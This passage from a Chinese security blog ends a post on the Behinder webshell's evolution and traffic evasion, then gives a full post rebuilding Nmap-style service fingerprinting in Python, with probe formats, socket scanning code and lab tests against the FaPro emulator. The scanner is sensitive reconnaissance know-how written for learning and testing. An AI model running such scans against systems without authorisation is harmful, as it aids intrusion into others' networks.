冰蝎的演化史，也是冰蝎“隐蔽”史，从功能实现、连接方式中很多角度都已看出冰蝎越来越阴，防不胜防。从更新日志上可以看得出冰蝎作者更新勤奋，撰写这篇文章期间冰蝎 4 小版本就出了三个，值得学习。而且从反编译的源码来看，每个大版本之间都改了很多，几乎重构，背后可以看出作者技术在不断精进。从冰蝎 1 到冰蝎 4，即使 webshell 的原理没有太大改变，作者在编写工具时投入的奇思和对于需求的考量也有很多值得参考的地方。
个人水平和时间都有限，还有一些功能没有实际测试，比如冰蝎 4 的二进制服务端等各种炫酷功能，有机会一定尝试一下。因为主要关注 PHP 马，对于 JSP、ASP 的细节没有深入研究，这里也有空补上。
还有一点，虽然使用冰蝎加密流量能够规避关键字检测，但在护网期间学习到蓝队直接把 IDS 设备放在负载均衡后面，到 IDS 的流量理应都是明文，请求体还是加密的流量基本可以全封了（还是有误报概率的，建议结合实际情况来看）。
参考资料：
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之 PHP 篇</a>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2799">利用动态二进制加密实现新型一句话木马之客户端篇</a>
<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">“冰蝎”动态二进制加密网站管理客户端</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">Nmap服务识别指纹库利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-19 18:12:16" itemprop="dateCreated datePublished" datetime="2022-07-19T18:12:16+08:00">2022-07-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-10 16:10:54" itemprop="dateModified" datetime="2022-11-10T16:10:54+08:00">2022-11-10</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.9k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>指纹库：</p>
<p>json 化方法：</p>
<h1 id="nmap-服务检测流量分析"><a class="markdownIt-Anchor" href="#nmap-服务检测流量分析"></a> Nmap 服务检测流量分析</h1>
<p>client 131 server130 端口[80,3306]，在 client 上运行 nmap，命令：<code>nmap -sC -sV -p 80,3306 192.168.42.130</code>
通信流量例子：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fn9fegmoXqic9Zbv3HoqAfwYrmWp.png" alt="" />
在 nmap 运行的 client 上会根据目标端口个数启用自身端口与之通信，例如目标端口[80,3306]，client 33776 端口和 server 80 端口通信，client 56362 和 server 3306 端口通信，每个端口依次开始通信的时间会间隔大约 1s，可以并行实现，提高检测速度。</p>
<h1 id="服务检测原理分析"><a class="markdownIt-Anchor" href="#服务检测原理分析"></a> 服务检测原理分析</h1>
<p>以 80 端口为例:
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtDnEsJPkNbCIkESmM6-PaUBTX0C.png" alt="" />
下面是一个最简单的探针（probe）的通信流程：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhSk-BC04Nty0UXQkNwcSwWmjJAy.svg" alt="" />基本就是先 TCP 三次握手，然后发探针，根据响应的内容，与指纹库中的 pattern 匹配，即可完成服务识别。
然后是一个复杂的探针：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft9P8YLkjGTupxGhL5wW96g3hTT8.png" alt="" />
和它的流量：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlTwWmy8KOfL-xYR8gV4uTWJTZaP.png" alt="" />
可以看到 TCP 协议加上“probestring”的内容就变成 http 包了，之后的数据通信依旧是 TCP 包，最后响应是 http 包。</p>
<h1 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h1>
<h3 id="tcp-探针"><a class="markdownIt-Anchor" href="#tcp-探针"></a> tcp 探针</h3>
<p>下面是 json 格式指纹库中的一个 tcp 探针例子：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TCP&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GetRequest&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probestring&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;ports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;8080-8085&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;sslports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;60443&quot;</span></span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;totalwaitms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;tcpwrappedms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;rarity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;fallback&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;matches&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;pattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^&lt;\\?xml version=\\\&quot;1\\.0\\\&quot;\\?&gt;\\r\\n&lt;!DOCTYPE cross-domain-policy SYSTEM \\\&quot;/xml/dtds/cross-domain-policy\\.dtd\\\&quot;&gt;\\r\\n&lt;cross-domain-policy&gt;\\r\\n    &lt;!-- This is a master socket policy file --&gt;\\r\\n    &lt;!-- No other socket policies on the host will be permitted --&gt;\\r\\n    &lt;site-control permitted-cross-domain-policies=\\\&quot;master-only\\\&quot;/&gt;\\r\\n    &lt;!-- This will allow access to port 1800 --&gt;\\r\\n    &lt;allow-access-from domain=\\\&quot;([^\\\&quot;]*)\\\&quot; to-ports=\\\&quot;([^\\\&quot;]*)\\\&quot;/&gt;\\r\\n&lt;/cross-domain-policy&gt;\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;adobe-crossdomain&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;pattern_flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;versioninfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                   <span class="attr">&quot;cpename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;h:snom:870&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;devicetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VoIP phone&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Snom 870 VoIP phone; domain: $1; ports: $2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;operatingsystem&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;vendorproductname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Adobe cross-domain policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">               <span class="punctuation">&#125;</span></span><br><span class="line">           <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   ......</span><br></pre></td></tr></table></figure>
<p>&quot;protocol&quot;指定走 TCP 还是 UDP，&quot;probestring&quot;指定携带的 payload。只要目标端口在 ports 里，就可以使用该探针进行测试，根据响应内容，使用 pattern 进行正则匹配，匹配成功就可以得到服务名称，甚至是服务版本了。</p>
<ul>
<li>方法一 构造 TCP 包</li>
</ul>
<p>使用 scapy 包实现三次握手是可行的，但是在实现过程中，需要精心构造 tcp 协议的各个字段，否则就会出现下面这张图的场景：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FpChNN70xKPetCpnY_Z5Zpxo5ZnV.png" alt="" /></p>
<p>这里面 TCP 的错误提示全部遇到过，观察 nmap 的流量，可以看到其 tcp 协议中的 options 字段如下：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp_pxRf1x6CcM3ZE8PCvipJf5edA.png" alt="" /></p>
<p>推测缺少某些关键的可选字段是 TCP 协议经常报错的主要原因。虽然不影响服务 mysql 的检出，该服务的探针位于指纹库首位，而且该探针没有 payload，比较特殊，所以该方法不一定对其他服务也生效。</p>
<ul>
<li>方法 2 socket 连接</li>
</ul>
<p>一个流式 socket 连接首先会进行 tcp 三次握手，符合要求，然后再发送探针，接收数据即可。
值得注意的是，http 探针的 probestring：<code>&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</code>，后面的<code>\r\n</code>转二进制没有被正确解码，需要自己添加。
或者我写了个探针转字节码的函数，感觉有点累赘，但可以规避其他错误（\0 转义等）：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def probestr2bytes(probe)<span class="punctuation">:</span></span><br><span class="line">    probe = probe.split(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    # 拆开类似这样&#x27;x07version&#x27;的字符串</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="string">&quot;x&quot;</span> and len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">                sub1 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                sub2 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="number">3</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                idx = probe.index(sub)</span><br><span class="line">                probe = probe<span class="punctuation">[</span><span class="punctuation">:</span>idx<span class="punctuation">]</span> + sub1 + sub2 + probe<span class="punctuation">[</span>idx + <span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span></span><br><span class="line">    # 转字节码，有&#x27;x72&#x27;，&#x27;version&#x27;，&#x27;<span class="number">0</span>&#x27;，&#x27;r&#x27;<span class="punctuation">,</span> &#x27;n&#x27;，四种类型</span><br><span class="line">    result_bytes = b&#x27;&#x27;</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">0</span><span class="punctuation">:</span></span><br><span class="line">            # &#x27;x72&#x27;</span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span></span><br><span class="line">                # print(int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>))</span><br><span class="line">                result_bytes += bytes(<span class="punctuation">[</span>int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>)<span class="punctuation">]</span>)</span><br><span class="line">            # &#x27;<span class="number">0</span>&#x27;空字符</span><br><span class="line">            elif sub == <span class="attr">&quot;0&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\<span class="number">0</span>&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;r&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\r&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\n&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            else<span class="punctuation">:</span></span><br><span class="line">                result_bytes += sub.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    return result_bytes</span><br></pre></td></tr></table></figure>
<p>成功识别成 http 协议:
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnvqZrCoydXnttQzUPMBSFqRjvxP.png" alt="" /></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_TCP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    # print(<span class="string">&quot;start TCP probe&quot;</span> + string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)</span><br><span class="line">    # 三次握手</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((ip<span class="punctuation">,</span> port))</span><br><span class="line">        # 使用scapy库中的sr系列函数收包</span><br><span class="line">        ss = StreamSocket(s<span class="punctuation">,</span> Raw)</span><br><span class="line">        # # 响应包数据文件不会很大，所以只收一个响应包即可，使用sr1</span><br><span class="line">        response = ss.sr1(Raw(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>))<span class="punctuation">,</span> timeout=<span class="number">0.5</span><span class="punctuation">,</span> verbose=<span class="number">0</span>)</span><br><span class="line">        s.close()</span><br><span class="line">        if response<span class="punctuation">:</span></span><br><span class="line">            # 遍历匹配表达式</span><br><span class="line">            for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">                if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=response<span class="punctuation">[</span>Raw<span class="punctuation">]</span>.load)<span class="punctuation">:</span></span><br><span class="line">                    # 输出结果</span><br><span class="line">                    info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    print(info)</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>扫描结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl9dxqs5tRy3ArNCEX4uhdLhMhMS.png" alt="" /></p>
<h3 id="udp-探针"><a class="markdownIt-Anchor" href="#udp-探针"></a> udp 探针</h3>
<p>这个地方深坑，一开始使用 scapy 实现收发 udp 包，但是发现 scapy 收不到 udp 的响应包，而在 wireshark 里一切正常，自制扫描器与 nmap 扫描的流量基本一致，关了防火墙也是如此。上网搜索原因，未果，放弃。
遂继续使用 socket 库实现收发功能，一切正常。值得注意的是，需要设置 timeout，要不然没有响应包就会一直卡在接收函数上。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_UDP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    ANY = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    # 创建UDP socket</span><br><span class="line">    s = socket.socket(socket.AF_INET<span class="punctuation">,</span> socket.SOCK_DGRAM<span class="punctuation">,</span> socket.IPPROTO_UDP)</span><br><span class="line">    # 允许端口复用</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET<span class="punctuation">,</span> socket.SO_REUSEADDR<span class="punctuation">,</span> <span class="number">1</span>)</span><br><span class="line">    # 绑定监听多播数据包的端口</span><br><span class="line">    s.bind((ANY<span class="punctuation">,</span> port))</span><br><span class="line">    s.sendto(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)<span class="punctuation">,</span> (ip<span class="punctuation">,</span> port))</span><br><span class="line">    s.settimeout(<span class="number">1</span>)</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        data<span class="punctuation">,</span> address = s.recvfrom(<span class="number">2048</span><span class="punctuation">,</span> )</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        pass</span><br><span class="line">    else<span class="punctuation">:</span></span><br><span class="line">        for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">            if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=data)<span class="punctuation">:</span></span><br><span class="line">                info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                print(info)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<h2 id="测试过程"><a class="markdownIt-Anchor" href="#测试过程"></a> 测试过程</h2>
<h3 id="搭建测试环境-fapro"><a class="markdownIt-Anchor" href="#搭建测试环境-fapro"></a> 搭建测试环境 fapro</h3>
<p>FaPro 是一个服务端协议模拟工具,可以轻松启停多个网络服务。用来测试服务扫描工具，显然比自己一个一个安装方便很多。
下载地址：<a target="_blank" rel="noopener" href="https://github.com/fofapro/fapro">https://github.com/fofapro/fapro</a>
环境建议：用 Win8 或 win10，试了 win7 提示 Windows 版本太低，win11 莫名报错；Linux 下开 fapro 上的服务显示端口占用，没找到解决方法，一不开心就给你 error 退出。以下测试在 win10 虚拟机里跑 fapro，win11 物理机上跑 nmap 和自制扫描器。
在 releases 中下载可执行文件：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkFftulHhJXTHxLHmtyWDFx0EKVP.png" alt="" />
拖到虚拟机里，在 fapro 的目录下打开终端，输入命令：
<code>fapro genConfig &gt; fapro.json</code>
得到配置 json 文件，这一步我 win11 和 win10 都试过，发现该文件是 utf-16 的编码，fapro 识别不了会报错（也很离谱），可以用 notepad++转成 utf-8 编码。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FneZutK7thpTkXEk07IatulsGlWV.png" alt="" />
输入运行命令：
<code>fapro run -v -l :8080</code>
浏览器中打开本机 ip:8080 即可看到配置界面：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtMFi_hK02smLq0IFBoIax3susEp.png" alt="" />
选择相应的服务，点击“+New”开启，可以在跑 fapro 的终端里看到日志信息：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FoeFVsRmbLF7bEdP8UyR6Aa9GTWB.png" alt="" />
如果这一步显示报错某个端口已经占用了，可以修改 fapro.json 文件中对应的端口。
简单试一下 ssh 服务（默认账号 root/123456）：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlnADP3RTC7TlUuwZB_gVmhUDpT8.png" alt="" />
fapro 对应输出：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FjrDoeOzF9v_4EGg9tnIYRojv6Ll.png" alt="" />
这样环境就搭好了。</p>
<h3 id="测试结果"><a class="markdownIt-Anchor" href="#测试结果"></a> 测试结果</h3>
<p>把 fapro 能开的服务全部打开，使用自制扫描器进行服务扫描的结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmS49Qk0YNvgvb_uSXRUclA7ilFH.png" alt="" />
使用 nmap 扫描的结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhbEX-Q9HExk0MJ3OiYESfX-pHsy.png" alt="" />
[111,554,1234,1433,1521,3389,5432,7001,8080,8888,9200,20000,49152]这些端口自制扫描器扫不到，以下是原因研究：
首先分析流量，下图是 nmap 扫 554（rtsp）端口的流量（命令：<code>nmap IP -p 554 -sV</code>）：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiqlKJCSNaXru5nAuPJ0b2E1F5Jv.png" alt="" />
发现握手之后，跑 fapro 的 host 会一直发[FIN,ACK]包，想结束这此通信，而跑 nmap 的 host 不甘心，一直发探针，但一直收不到回应，这就是自制扫描器扫不出来的原因，自制扫描器需要根据响应内容进行正则匹配来判断。
nmap 结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FscI3BnXh1yQNEErR3AJV4TAGjaf.png" alt="" />
rtsp 后面的“？” 很可疑！
换一个端口跑 rtsp 服务：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq27ZY4J5hWbKQ0WppyRfzeR7U1Q.png" alt="" />
扫 555 端口 rtsp 服务的 nmap 结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FormpTs5yQAvmWq18KZ4bjf4WvLq.png" alt="" />
果然！因为没有响应包，nmap 也不能确认 555 端口跑的具体什么服务，直接根据端口判断成另外一个服务了。
新机子瓦伊多姿，如果响应包内容不在 nmap 的指纹库内，nmap 并不能判断该端口上跑的服务，只是根据端口判断。
到这里，基本可以实现了与 nmap 同等能力的服务识别功能。</p>
<h1 id="改进"><a class="markdownIt-Anchor" href="#改进"></a> 改进</h1>
<ul>
<li>ssl 还没有测试</li>
<li>结果输出未做去重和排序，单纯开线程跑，各种包的响应速度不一样导致结果输出不可控</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">c4ooc0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">19k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:09</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"per_page":true,"tags":"none","engine":"mathjax","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<script class="next-config" data-name="exif" type="application/json">"{FocalLength}mm f/{FNumber} {ExposureTime}s"</script>
<script src="https://fastly.jsdelivr.net/npm/exif-js@2/exif.min.js"></script>
<script src="/lib/exif.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
</html>
